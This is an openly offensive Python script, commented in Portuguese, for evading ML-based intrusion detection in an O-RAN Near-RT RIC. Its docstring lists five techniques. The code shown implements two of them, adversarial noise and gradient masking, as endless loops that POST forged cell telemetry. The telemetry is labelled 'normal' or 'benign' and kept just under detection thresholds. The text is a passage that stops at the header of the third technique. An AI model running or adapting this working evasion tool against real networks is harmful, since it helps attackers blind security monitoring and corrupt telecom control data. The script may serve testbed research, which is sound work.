"""
ataque_ids_evasion.py - Ataque de Evasão de IDS para O-RAN
Alvo: Sistemas de Detecção de Intrusão (ML-based) no Near-RT RIC

Técnicas:
    1. Adversarial Noise Injection (xApp) - ruído gaussiano FGSM-like
    2. Gradient Masking (xApp) - distribuição normal falsa engana gradientes
    3. Data Camouflage (rApp) - políticas maliciosas mascaradas como legítimas
    4. Time Drifting (xApp+rApp) - alteração gradual evita thresholds
    5. Hypoglyph Injection (rApp) - valores limítrofes confundem ML
"""

import threading
import urllib.request
import json
import time
import random
import math
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: EVASAO DE IDS - O-RAN")
print(f"  Alvo: {BASE_URL}")
print("  5 tecnicas de evasao contra detectores ML")
print("=" * 60)

# Distribuicoes de referencia (aprendidas pelo IDS)
REF_LOAD_MEAN = 100
REF_LOAD_STD = 25
REF_LAT_MEAN = 12
REF_LAT_STD = 3
REF_USERS_MEAN = 32
REF_USERS_STD = 10

# ============================================================
# TECNICA 1: ADVERSARIAL NOISE (xApp)
# ============================================================

def tecnica1_adversarial_noise():
    """Ruido adversarial FGSM-like contra classificador ML do xApp"""
    step = 0
    while True:
        try:
            step += 1
            # epsilon varia senoidalmente para não ser constante
            epsilon = 0.15 + 0.05 * math.sin(step * 0.1)

            ataque = {
                "id": f"adv-worker-{random.randint(1, 20)}",
                "latency_ms": round(REF_LAT_MEAN + epsilon * 4 + random.gauss(0, 0.5), 2),
                "type": "benchmark",
                "cell_load_mbps": round(REF_LOAD_MEAN + epsilon * REF_LOAD_STD * 2.5, 1),
                "cell_capacity_mbps": 100,
                "connected_users": max(5, int(REF_USERS_MEAN - epsilon * REF_USERS_STD * 3)),
                "status": "normal",
                "temperature_bbu": round(42 + epsilon * 10 + random.gauss(0, 0.3), 1),
                "rsrp_dbm": round(-100 + epsilon * 20, 1),
                "attack_flag": "benign"  # engana classificadores de string
            }

            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2): 
                pass
            time.sleep(1)
        except Exception as e:
            print(f"[IDS-T1:Adversarial] Erro: {e}")
            time.sleep(1)

# ============================================================
# TECNICA 2: GRADIENT MASKING (xApp)
# ============================================================

def tecnica2_gradient_masking():
    """Engana detecção baseada em gradiente - 70% normal, 30% sutil"""
    time.sleep(5)
    while True:
        try:
            if random.random() < 0.7:
                # Totalmente normal
                load = round(random.gauss(REF_LOAD_MEAN, REF_LOAD_STD), 1)
                users = int(random.gauss(REF_USERS_MEAN, REF_USERS_STD))
                lat = round(random.gauss(REF_LAT_MEAN, REF_LAT_STD), 2)
                status = "normal"
            else:
                # Anomalia sutil - dentro de 2.0 std (limiar do detectar)
                load = round(REF_LOAD_MEAN + random.uniform(1.5, 2.0) * REF_LOAD_STD, 1)
                users = max(5, int(REF_USERS_MEAN - random.uniform(1.2, 1.8) * REF_USERS_STD))
                lat = round(REF_LAT_MEAN + random.uniform(0.5, 1.5) * REF_LAT_STD, 2)
                status = "normal"  # MASCARA como normal!

            ataque = {
                "id": f"mask-worker-{random.randint(1, 20)}",
                "latency_ms": lat,
                "type": "benchmark",
                "cell_load_mbps": load,
                "cell_capacity_mbps": 100,
                "connected_users": users,
                "status": status,
                "temperature_bbu": round(42 + random.gauss(0, 1.5), 1)
            }

            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2): 
                pass
            time.sleep(0.5)
        except Exception as e:
            print(f"[IDS-T2:Gradient] Erro: {e}")
            time.sleep(1)

# ============================================================
# TECNICA 3: DATA CAMOUFLAGE (rApp)
# ============================================================